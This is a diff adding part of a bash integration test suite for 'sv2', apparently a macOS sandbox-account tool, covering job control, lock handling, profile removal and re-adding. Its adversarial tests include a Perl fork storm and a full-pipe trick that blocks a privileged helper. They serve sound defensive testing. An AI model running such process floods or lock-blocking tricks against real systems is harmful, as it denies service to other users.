+    # A shell that will not exit must not hang the suite.
+    while /bin/kill -0 "$!" 2>/dev/null; do
+        if [[ "$waited" -ge 120 ]]; then
+            echo "watchdog: the shell did not exit in 60 seconds; processes then:"
+            /bin/ps -axo pid,ppid,pgid,stat,user,command \
+                | /usr/bin/grep -E "sv2-helper|[/]sudo |/sv2 |$ACCOUNT|sv2-$HOST_USER-$P2" \
+                | /usr/bin/grep -v grep | /usr/bin/cut -c1-160
+            # Not the keystrokes: a known wait in macOS (design doc, open
+            # item 10), which this check happened to be the one to meet.
+            if /usr/bin/pgrep -f '^/usr/bin/dscl \. -delete /Users/sv2-' >/dev/null; then
+                echo "the helper is waiting for dscl to delete an account: macOS is asking, or" \
+                    "waiting to be asked, whether your terminal may administer this computer"
+            fi
+            /usr/bin/pkill -f "$SCRATCH/no-rcfile" || true
+            break
+        fi
+        /bin/sleep 0.5
+        waited=$((waited + 1))
+    done
+    /usr/bin/tr -d '\r' < "$out"
+}
+# The control: the keystroke does arrive, and does stop a session. (An odd
+# duration, so that the pattern matches this sleep and no other.)
+OUT="$(job_control '"$SV2" --profile "$P" shell /bin/sleep 3.25; echo "status=$?"' '^/bin/sleep 3\.25$' 10)"
+if [[ "$OUT" == *"Stopped"* && "$OUT" == *"jobs=1"* ]]; then
+    pass "^Z: suspends a session (control)"
+else
+    fail "^Z: suspends a session (control)" "$OUT"
+fi
+# The same keystrokes at a helper that holds the lock exclusively.
+OUT="$(job_control '"$SV2" profile add "$P2" >/dev/null 2>&1; echo "status=$?"' "^$HELPER call [^ ]+ profile-add $P2\$" 400)"
+if [[ "$OUT" == *"status=0"* && "$OUT" == *"jobs=0"* && "$OUT" != *"Stopped"* ]]; then
+    pass "^Z: does not suspend the helper while it holds the lock"
+else
+    fail "^Z: does not suspend the helper while it holds the lock" "$OUT"
+fi
+check "^Z: and the command it was typed at finished its work" "active" \
+    "$("$SV2" profile list | /usr/bin/awk -v p="$P2" '$1 == p {print $2}')"
+OUT="$(job_control '"$SV2" profile remove "$P2" >/dev/null 2>&1; echo "status=$?"' "^$HELPER call [^ ]+ profile-remove $P2\$" 400)"
+if [[ "$OUT" == *"status=0"* && "$OUT" == *"jobs=0"* && "$OUT" != *"Stopped"* ]]; then
+    pass "^Z: does not suspend a removal either"
+else
+    fail "^Z: does not suspend a removal either" "$OUT"
+fi
+
+# The caller chooses the helper's standard output. A pipe that is already
+# full blocks the helper where it prints, for as long as the caller likes;
+# the registry lock must not be held there, or everybody else's sv2 waits.
+# The first helper lists profiles into a full pipe; the second command needs
+# the lock exclusively. "first=blocked" shows the attack was in place.
+FULL_PIPE='
+use strict; use Fcntl; use POSIX ":sys_wait_h"; use Time::HiRes qw(sleep);
+my ($helper, $version, $profile, $sv2) = @ARGV;
+pipe(my $r, my $w) or die;
+my $fl = fcntl($w, F_GETFL, 0); fcntl($w, F_SETFL, $fl | O_NONBLOCK);
+1 while defined(syswrite($w, "x"));
+fcntl($w, F_SETFL, $fl);
+my $pid = fork;
+if (!$pid) { open(STDOUT, ">&", $w) or die; close $r;
+  exec "/usr/bin/sudo", "-n", "--", $helper, "call", $version, "profile-list"; die }
+sleep 1.5;
+my $first = waitpid($pid, WNOHANG) == 0 ? "blocked" : "finished";
+my $pid2 = fork;
+if (!$pid2) { open(STDOUT, ">", "/dev/null"); open(STDERR, ">", "/dev/null");
+  exec $sv2, "profile", "add", $profile; die }
+my $second = "waited";
+for (1..100) { if (waitpid($pid2, WNOHANG) != 0) { $second = "ran"; last } sleep 0.1 }
+kill "KILL", $pid2 if $second eq "waited";
+close $w; my $buf; 1 while sysread($r, $buf, 65536);
+waitpid($pid, 0); waitpid($pid2, 0) if $second eq "waited";
+print "first=$first second=$second";
+'
+check "helper: printing into a full pipe does not hold the lock" "first=blocked second=ran" \
+    "$(/usr/bin/perl -e "$FULL_PIPE" "$HELPER" "$VERSION" "$P" "$SV2")"
+
+###############################################################################
+# profile remove
+###############################################################################
+section "profile remove"
+# A detached process outlives the session, and removal kills it.
+sb /bin/sh -c '/usr/bin/nohup /bin/sleep 600 >/dev/null 2>&1 &'
+if /usr/bin/pgrep -u "$SB_UID" -x sleep >/dev/null; then
+    pass "detached process outlives the session"
+else
+    fail "detached process outlives the session"
+fi
+# A private file of the sandbox's, kept across removal (see re-add below).
+sb /bin/sh -c 'umask 077; echo kept > sandbox-kept'
+# And a tree the host has no way into: no ACL, private, closed to its owner.
+sb /bin/sh -c 'umask 077; mkdir -p held-kept/in && echo held > held-kept/in/file && chmod -R -N held-kept && chmod 000 held-kept/in held-kept'
+# A home laid out to resist deletion: immutable file, unreadable directories.
+sb /bin/sh -c 'mkdir -p ~/deep/tree && echo x > ~/deep/tree/file && chflags uchg ~/deep/tree/file && chmod 000 ~/deep/tree ~/deep'
+
+# A fork storm: processes that fork and exit without pause, so that a pass of
+# SIGKILL always leaves some that were born during it. It is bounded (400
+# processes, by a limit it cannot raise) and ends by itself after a minute,
+# whatever becomes of this test. Measured on 2026-11-25: the removal used
+# until then (SIGKILL every 100 ms, 20 times) left 391 of these running and
+# failed.
+STORM='$SIG{HUP}="IGNORE"; my $end=time+60; while (time < $end) { my $p=fork; if (defined $p && $p==0) { srand; next } exit if rand() < 0.2 }'
+sb /bin/sh -c 'ulimit -u 400; /usr/bin/perl -e "$1" >/dev/null 2>&1 &' sh "$STORM"
+STORM_START="$(/bin/date +%s)"
+# It grows at the speed of the machine: a CI runner had 287 after a second.
+for _ in {1..100}; do
+    /bin/sleep 0.1
+    STORM_SIZE="$(/bin/ps -u "$SB_UID" -o pid= | /usr/bin/wc -l | /usr/bin/tr -d ' ')"
+    [[ "$STORM_SIZE" -ge 300 ]] && break
+done
+if [[ "$STORM_SIZE" -ge 300 ]]; then
+    pass "fork storm: running before the removal"
+else
+    fail "fork storm: running before the removal" "only $STORM_SIZE processes"
+fi
+
+OUT="$("$SV2" profile remove "$P")" && RC=0 || RC=$?
+check "remove: succeeds against a fork storm" "0" "$RC"
+if [[ "$RC" -ne 0 ]]; then
+    # Let the storm end by itself, then finish the removal, so that the
+    # checks below fail for their own reasons only.
+    echo "     waiting for the fork storm to end"
+    while [[ "$(/bin/date +%s)" -lt $((STORM_START + 62)) ]]; do /bin/sleep 1; done
+    OUT="$("$SV2" profile remove "$P")"
+fi
+if /usr/bin/pgrep -u "$SB_UID" >/dev/null; then fail "remove: kills the account's processes"; else pass "remove: kills the account's processes"; fi
+if account_exists; then fail "remove: account deleted"; else pass "remove: account deleted"; fi
+if [[ -e "/Users/$ACCOUNT" ]]; then fail "remove: home deleted"; else pass "remove: home deleted"; fi
+if [[ -e "$SB" ]]; then fail "remove: sandbox profile deleted"; else pass "remove: sandbox profile deleted"; fi
+# The shared group lists members by name; a stale entry would outlive the
+# account. (With no member left the group has no such attribute, and
+# dscl says so on standard error.)
+check "remove: account is no longer listed in sv2-sandboxes" "" \
+    "$(/usr/bin/dscl . -read /Groups/sv2-sandboxes GroupMembership 2>/dev/null | /usr/bin/tr ' ' '\n' | /usr/bin/grep -x "$ACCOUNT" || true)"
+# host-file is still there: the user's files are never deleted.
+if [[ -f "$WS/host-file" && "$OUT" == *"kept $WS"* ]]; then
+    pass "remove: non-empty workspace is kept and reported"
+else
+    fail "remove: non-empty workspace is kept and reported" "$OUT"
+fi
+# sv2 itself, as the host user, takes over what the removed account owned.
+check "remove: kept files become the host user's" "$HOST_UID $HOST_UID" \
+    "$($STAT -f '%u' "$WS/sandbox-kept") $($STAT -f '%u' "$WS/host-file")"
+check "remove: kept files keep their mode" "600" "$($STAT -f '%Lp' "$WS/sandbox-kept")"
+# The account handed it over before it was deleted; afterwards nobody could.
+check "remove: what the account held is the host user's too" "$HOST_UID $HOST_UID $HOST_UID held" \
+    "$({ $STAT -f '%u' "$WS/held-kept" "$WS/held-kept/in" "$WS/held-kept/in/file"; /bin/cat "$WS/held-kept/in/file"; } 2>&1 \
+        | /usr/bin/tr '\n' ' ' | /usr/bin/sed 's/ $//')"
+/bin/chmod -R u+rwx "$WS/held-kept" 2>/dev/null
+/bin/rm -rf "$WS/held-kept" 2>/dev/null
+if [[ -e "$WS/held-kept" ]]; then
+    fail "remove: and the host user can delete it"
+else
+    pass "remove: and the host user can delete it"
+fi
+check "remove: no longer listed" "" "$("$SV2" profile list | /usr/bin/awk -v p="$P" '$1 == p')"
+refused "remove: no session after removal" "${CALL[@]}" launch "$P" -- /usr/bin/true
+if [[ -e "$HOME/.local/state/sandvault2/deploy-keys/$P" ]]; then
+    fail "remove: the host's copies of the profile's deploy keys are forgotten"
+else
+    pass "remove: the host's copies of the profile's deploy keys are forgotten"
+fi
+
+# Adding the name again reuses the kept workspace, under a new UID.
+"$SV2" profile add "$P" >/dev/null
+NEW_UID="$(/usr/bin/dscl . -read "/Users/$ACCOUNT" UniqueID | /usr/bin/awk '{print $2}')"
+if [[ "$NEW_UID" =~ ^[0-9]+$ && "$NEW_UID" -gt "$SB_UID" ]]; then
+    pass "re-add: UID is not reused"
+else
+    fail "re-add: UID is not reused" "old $SB_UID new $NEW_UID"
+fi
+check "re-add: the new account is refused by sshd as well" \
+    "authorizedkeysfile none|denygroups sv2-sandboxes|forcecommand /usr/bin/false|pubkeyauthentication no|" \
+    "$(sshd_applies "$ACCOUNT")"
+# The directory is reused, and 'profile add' rewrites the ACLs of the files
+# in it for the new account: no separate repair.
+check "re-add: kept workspace directory is reused" "host-file sandbox-kept" \
+    "$(sb /bin/ls | /usr/bin/tr '\n' ' ' | /usr/bin/sed 's/ $//')"
+check "re-add: the new account can use the kept files at once" "kept changed" \
+    "$(sb /bin/sh -c 'cat sandbox-kept host-file && echo more >> sandbox-kept && echo more >> host-file' 2>&1 \
+        | /usr/bin/tr '\n' ' ' | /usr/bin/sed 's/ $//')"
+check "re-add: nothing is left to repair" "repaired 0, already correct 2, skipped 0" "$("$SV2" repair "$WS" 2>&1)"
+
+# The same when the account went without sv2 seeing it (here: the helper
+# called directly), so its files belong to no account when the profile is
+# added again.
+sb /bin/sh -c 'umask 077; mkdir orphans && echo orphan > orphans/file'
+/bin/rm -f "$WS/host-file" "$WS/sandbox-kept"
+"${CALL[@]}" profile-remove "$P" >/dev/null
+check "re-add: precondition, kept files belong to no account" "$NEW_UID $NEW_UID" \
+    "$($STAT -f '%u' "$WS/orphans") $($STAT -f '%u' "$WS/orphans/file")"
+OUT="$("$SV2" profile add "$P" 2>&1 >/dev/null)"
+if [[ "$OUT" == *"2 kept files and directories made usable"* ]]; then
+    pass "re-add: says what it did to the kept files"
+else
+    fail "re-add: says what it did to the kept files" "$OUT"
+fi
+check "re-add: files of a vanished account become the host user's" "$HOST_UID $HOST_UID" \
+    "$($STAT -f '%u' "$WS/orphans") $($STAT -f '%u' "$WS/orphans/file")"
+check "re-add: and the new account can use them" "orphan" \
+    "$(sb /bin/sh -c 'cat orphans/file && echo more >> orphans/file' 2>&1)"
+/bin/rm -rf "$WS/orphans"
+"$SV2" profile remove "$P" >/dev/null
+if [[ -e "$WS" ]]; then fail "remove: empty workspace is removed"; else pass "remove: empty workspace is removed"; fi
+
+echo
+if [[ "$FAILED" -ne 0 ]]; then
+    echo -e "${RED}sv2 integration: $FAILED failed, $PASSED passed in ${SECONDS}s${NC}"
+    exit 1
+fi
+echo -e "${GREEN}sv2 integration: $PASSED passed in ${SECONDS}s${NC}"
